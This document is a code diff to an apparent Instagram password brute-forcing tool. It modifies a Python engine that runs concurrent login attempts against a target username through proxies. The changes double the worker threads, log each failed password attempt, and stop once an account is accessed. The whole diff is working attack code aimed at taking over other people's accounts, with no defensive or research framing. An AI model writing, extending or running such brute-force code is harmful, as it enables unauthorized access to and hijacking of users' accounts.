@@ -25,19 +25,18 @@ class Engine(object):
 
     __loggers__ = {
         '_attack': 'Attack',
-        '_attack_asynchronously': 'Attack',
         '_login_with_proxy': 'Login with Proxy',
         '_get_token_for_proxy': 'Fetching Token for Proxy',
         '_create_login_tasks': 'Queueing Up Login Tasks',
         '__base__': 'Instagram Engine',
         '_dump_password_attempts': 'Storing Attempted Passwords',
+        'store_attempted_password': 'Storing Attempted Password',
     }
 
     def __init__(self, username):
         self.user = User(username)
         self.queues = self.__queue_manager__(user=self.user)
 
-        # self._configure_logger()
         logging.setLoggerClass(EngineLogger)
         self.log = logging.getLogger(self.__loggers__['__base__'])
 
@@ -163,7 +162,7 @@ class EngineAsync(Engine):
 
         try:
             self.event_loop.run_until_complete(
-                self._attack_asynchronously(token))
+                self._attack(token))
         finally:
             self.event_loop.close()
 
@@ -180,17 +179,16 @@ class EngineAsync(Engine):
         self.queues.tokens.put_nowait(token)
 
     @auto_logger
-    async def _attack_asynchronously(self, token, log):
+    async def _attack(self, token, log):
 
         # Try with and without creating a new loop inside
         loop = asyncio.get_event_loop()
         stop_event = asyncio.Event()
 
-        executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=20)
         tasks = self._create_login_tasks(executor, loop, stop_event, token)
 
         await asyncio.gather(*tasks)
-        self._dump_password_attempts()
 
     async def _get_token_asynchronously(self):
 
@@ -217,6 +215,11 @@ class EngineAsync(Engine):
 
         return result.result()
 
+    # @auto_logger
+    # async def store_attempted_password(self, password, log):
+    #     log.info("Storing Attempting Password")
+    #     self.user.add_password_attempt(password)
+
     def _login(self, password, token, stop_event):
         while not stop_event.is_set():
             try:
@@ -232,8 +235,18 @@ class EngineAsync(Engine):
                     if results.accessed:
                         self.log.success("Accessed Account... Setting Stop Event")
                         stop_event.set()
+
+                        # Just doing this temporarily when dealing with a lot of
+                        # passwords so we don't lose the authenticated one.
+                        self.log.exit("Accessed Account... Setting Stop Event")
                     else:
                         self.queues.put('attempt', password)
+
+                        # Doing this asynchronously keeps hitting an event loop
+                        # closed error, so for now we will just add like this.
+                        self.user.add_password_attempt(password)
+                        # loop = asyncio.get_running_loop()
+                        # loop.run_until_complete(self.store_attempted_password(password))
                     return results
 
         self.log.info("Aborting Task")
